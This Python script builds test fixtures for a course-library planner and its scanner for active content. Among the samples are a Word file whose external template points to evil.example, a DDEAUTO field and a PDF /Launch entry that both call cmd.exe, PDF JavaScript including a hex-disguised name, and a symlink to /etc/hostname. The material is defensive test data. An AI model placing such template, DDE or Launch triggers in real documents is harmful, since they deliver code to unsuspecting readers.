#!/usr/bin/env python3
"""Build a library folder that exercises every decision the planner makes, for comparing the
helper script with the plugin's C# port (tools/planner-compare). Usage: fixtures.py DIR

Covers: lesson matching by name, by first stem and by number (and an ambiguous number), the
attached_files/<lesson>/ rule, section and course material, a course packaged as one because a
subfolder has no videos, hidden files, Jellyfin artwork and data folders, subtitles and nfo,
every skip rule, existing trigger archives, symbolic links, extension-less files, executables,
archives holding executables or active documents, and each kind of active document content."""
import io
import os
import sys
import zipfile
import zlib
from pathlib import Path

root = Path(sys.argv[1])
VIDEO = b"\x00\x00\x00\x18ftypmp42"  # content is never read for videos


def put(rel: str, data: bytes | str = b"x") -> Path:
    p = root / rel
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_bytes(data.encode() if isinstance(data, str) else data)
    return p


def zipped(members: dict[str, bytes | str]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for name, data in members.items():
            z.writestr(name, data)
    return buf.getvalue()


def ooxml(extra: dict[str, bytes | str] | None = None, rels: str = "") -> bytes:
    members = {"[Content_Types].xml": "<Types/>", "word/document.xml": "<w:document/>",
               "word/_rels/document.xml.rels": f"<Relationships>{rels}</Relationships>"}
    members.update(extra or {})
    return zipped(members)


def pdf(body: bytes) -> bytes:
    return b"%PDF-1.7\n" + body + b"\n%%EOF\n"


def stream(content: bytes, header: bytes = b"<< /Length 99 /Filter /FlateDecode >>") -> bytes:
    return header + b"\nstream\r\n" + zlib.compress(content) + b"\r\nendstream\n"


# ---- course 1: lessons, sections, rules -----------------------------------------------------
c = "Course One"
for s, lessons in {"Section 1 - Intro": ["1 - Welcome", "2 - Setup", "3 - Lab"], "Section 2 - More": ["01 - Routing", "02 - Switching"]}.items():
    for v in lessons:
        put(f"{c}/{s}/{v}.mp4", VIDEO)
put(f"{c}/Section 1 - Intro/1 - Welcome.pdf", "same name")                     # same name
put(f"{c}/Section 1 - Intro/1 - Welcome.pdf.pdf", "double extension")          # first stem
put(f"{c}/Section 1 - Intro/2 - Slides.pptx", zipped({"[Content_Types].xml": "<Types/>", "ppt/x.xml": "x"}))  # lesson number
put(f"{c}/Section 1 - Intro/3 - Lab.pkt", b"\x00pkt")
put(f"{c}/Section 1 - Intro/Overview.txt", "section material, no lesson")
put(f"{c}/Section 1 - Intro/attached_files/2 - Setup/setup-guide.pdf", pdf(b"1 0 obj << >> endobj"))
put(f"{c}/Section 1 - Intro/attached_files/Unknown Lesson/stray.txt", "no lesson by that name")
put(f"{c}/Section 1 - Intro/resources/3/notes.txt", "resources/<number>")
put(f"{c}/Section 2 - More/1 - Overlap A.txt", "ambiguous? no: only one video numbered 1 here")
put(f"{c}/Section 2 - More/Lab Topology.png", b"\x89PNG\r\n\x1a\nxx")
put(f"{c}/course-notes.md", "course folder material")
put(f"{c}/Section 1 - Intro/1 - Welcome.srt", "1\n00:00 --> 00:01\nhi")      # subtitle
put(f"{c}/Section 1 - Intro/1 - Welcome.nfo", "<episodedetails/>")            # nfo
put(f"{c}/Section 1 - Intro/1 - Welcome-thumb.jpg", b"\xff\xd8\xff\xe0")      # Jellyfin artwork
put(f"{c}/poster.jpg", b"\xff\xd8\xff\xe0")
put(f"{c}/Section 1 - Intro/metadata/x.txt", "Jellyfin data folder")
put(f"{c}/Section 1 - Intro/1 - Welcome.trickplay/320/0.jpg", b"\xff\xd8\xff\xe0")
put(f"{c}/.hidden.txt", "dot file")
put(f"{c}/Section 1 - Intro/.cache/y.txt", "dot folder")
put(f"{c}/Section 1 - Intro/1 - Welcome_chapters.xml", "<chapters/>")         # rule: chapter sidecars (quiet)
put(f"{c}/Section 1 - Intro/Get Bonus Downloads Here.url", "[InternetShortcut]\nURL=https://x")
put(f"{c}/Section 1 - Intro/Thumbs.db", b"\x00")
put(f"{c}/Bonus Resources.txt", "https://freecourseweb.com\nhttps://devcourseweb.com\n")
put(f"{c}/[ FreeCourseWeb.com ] Read Me.txt", "visit us")
put(f"{c}/Section 2 - More/Visit.txt", "More courses:\nhttps://a.example\nhttps://b.example\n")  # link-only text
put(f"{c}/Section 2 - More/Passwords.txt", "password: SAnet.ST\nhttps://DevCourseWeb.com\n")    # advert text
put(f"{c}/Section 2 - More/2. Quiz 1.html", '<script>window.location = "https://www.udemy.com/q";</script>')
put(f"{c}/Section 2 - More/4. Quiz 2.html", '<meta http-equiv="refresh" content="0; url=https://www.udemy.com/x?a=1&amp;b=2">')  # meta refresh: link
put(f"{c}/Section 2 - More/5. Quiz 3.html", '<script>location.href = "javascript:alert(1)"</script>')       # left out, no link
put(f"{c}/Section 2 - More/3. FAQ.html", "<p>Real content about labs, long enough to keep the file.</p>" * 3)
put(f"{c}/Section 2 - More/Real Notes.txt", "Remember to save your configs.\nhttps://example.com\n")
put(f"{c}/Section 1 - Intro/1 - Welcome.material.zip", zipped({"old.txt": "old"}))  # existing trigger
put(f"{c}/additional-material.zip", zipped({"old.txt": "old"}))
put(f"{c}/Section 2 - More/Plan200301docx", ooxml())                            # lost extension: OOXML
put(f"{c}/Section 2 - More/Handout", pdf(b"1 0 obj << >> endobj"))            # lost extension: PDF
put(f"{c}/Section 2 - More/Picture", b"\x89PNG\r\n\x1a\nxx")                   # lost extension: PNG
put(f"{c}/Section 2 - More/README", "plain text, no extension")
os.symlink("course-notes.md", root / c / "link-to-notes.md")
os.symlink("/etc/hostname", root / c / "Section 2 - More" / "outside.txt")

# ---- course 2: executables and active content ------------------------------------------------
c = "Course Two"
put(f"{c}/1 - Only Lesson.mp4", VIDEO)
put(f"{c}/1 - Only Lesson.exe", b"MZ")
put(f"{c}/tools/installer.msi", b"\xd0\xcf\x11\xe0")
put(f"{c}/scripts.ps1", "Write-Host hi")
put(f"{c}/macro.docm", ooxml())
put(f"{c}/archive-with-exe.zip", zipped({"setup.exe": "MZ", "readme.txt": "hi"}))
put(f"{c}/nested.zip", zipped({"inner.zip": zipped({"evil.dll": "MZ"}), "ok.txt": "ok"}))
put(f"{c}/docs-with-macros.zip", zipped({"report.docx": ooxml({"word/vbaProject.bin": "x"}), "fine.pdf": pdf(b"")}))
put(f"{c}/clean.zip", zipped({"a.txt": "a", "b.pdf": pdf(b"1 0 obj << >> endobj")}))
put(f"{c}/archive.7z", b"7z\xbc\xaf\x27\x1c")                                    # cannot be checked without 7z
put(f"{c}/vba.docx", ooxml({"word/vbaProject.bin": "x"}))
put(f"{c}/ole.docx", ooxml({"word/embeddings/oleObject1.bin": "x"}))
put(f"{c}/activex.docx", ooxml({"word/activeX/activeX1.xml": "x"}))
put(f"{c}/template.docx", ooxml(rels='<Relationship Id="r1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://evil.example/t.dotm" TargetMode="External"/>'))
put(f"{c}/frame.docx", ooxml(rels='<Relationship Id="r2" Type="http://x/relationships/frame" Target="file:///c:/x" TargetMode="External"/>'))
put(f"{c}/hyperlink.docx", ooxml(rels='<Relationship Id="r3" Type="http://x/relationships/hyperlink" Target="https://ok.example" TargetMode="External"/>'))
put(f"{c}/dde.docx", ooxml({"word/document.xml": "<w:instrText>DDEAUTO c:\\\\windows\\\\cmd.exe</w:instrText>"}))
put(f"{c}/clean.docx", ooxml())
put(f"{c}/old.doc", b"\xd0\xcf\x11\xe0" + "_VBA_PROJECT".encode("utf-16-le"))
put(f"{c}/objects.xls", b"\xd0\xcf\x11\xe0" + "ObjectPool".encode("utf-16-le"))
put(f"{c}/plain.ppt", b"\xd0\xcf\x11\xe0nothing")
put(f"{c}/object.rtf", r"{\rtf1 {\object\objemb hello}}")
put(f"{c}/plain.rtf", r"{\rtf1 hello}")
put(f"{c}/js.pdf", pdf(b"1 0 obj << /S /JavaScript /JS (app.alert(1)) >> endobj"))
put(f"{c}/launch.pdf", pdf(b"1 0 obj << /S /Launch /F (cmd.exe) >> endobj"))
put(f"{c}/embedded.pdf", pdf(b"1 0 obj << /Type /EmbeddedFile >> endobj"))
put(f"{c}/hexname.pdf", pdf(b"1 0 obj << /S /J#61vaScript >> endobj"))
put(f"{c}/compressed-js.pdf", pdf(stream(b"<< /S /JavaScript /JS (x) >>", b"<< /Type /ObjStm /N 1 /Filter /FlateDecode >>")))
put(f"{c}/image-js-bytes.pdf", pdf(stream(b"\x00\x01/JS\x02\x03" * 100, b"<< /Subtype /Image /Filter /FlateDecode >>")))
put(f"{c}/text-stream.pdf", pdf(stream(b"BT /F1 12 Tf (Hello /JSON world) Tj ET")))
put(f"{c}/corrupt-stream.pdf", pdf(b"<< /Length 5 >>\nstream\r\nnot zlib data\r\nendstream\n"))
put(f"{c}/clean.pdf", pdf(b"1 0 obj << /Type /Catalog >> endobj"))
put(f"{c}/noext-macro", ooxml({"word/vbaProject.bin": "x"}))                     # no extension, active OOXML
put(f"{c}/noext-js", pdf(b"<< /JS (x) >>"))

# ---- course 3: packaged as one (a subfolder with material but no videos) ----------------------
c = "Course Three"
put(f"{c}/Module 1/1 - Start.mp4", VIDEO)
put(f"{c}/Module 1/1 - Start.pdf", "lesson file, but the course is packaged")
put(f"{c}/Module 1/extra.txt", "section file")
put(f"{c}/Labs/lab1.txt", "no videos in Labs")
put(f"{c}/Labs/sub/lab2.txt", "deeper")
put(f"{c}/readme.txt", "top")

# ---- course 4: videos only in subfolders, numbers that collide --------------------------------
c = "Course Four"
put(f"{c}/Part A/1 - Alpha.mkv", VIDEO)
put(f"{c}/Part A/1 - Alpha Extra.mkv", VIDEO)            # two videos numbered 1: number matching is ambiguous
put(f"{c}/Part A/1 - Notes.txt", "ambiguous lesson number: goes to the section")
put(f"{c}/Part A/1 - Alpha.txt", "same name still matches")
put(f"{c}/Part B/10 - Ten.webm", VIDEO)
put(f"{c}/Part B/010 - Notes.txt", "leading zeros: lesson 10")
put(f"{c}/Part B/10.5 - Half.txt", "number then dot")
put(f"{c}/Part B/Ten.txt", "no number")

# ---- not a course: no videos anywhere --------------------------------------------------------
put("Not A Course/file.txt", "ignored: no videos")
print(f"fixtures in {root}")
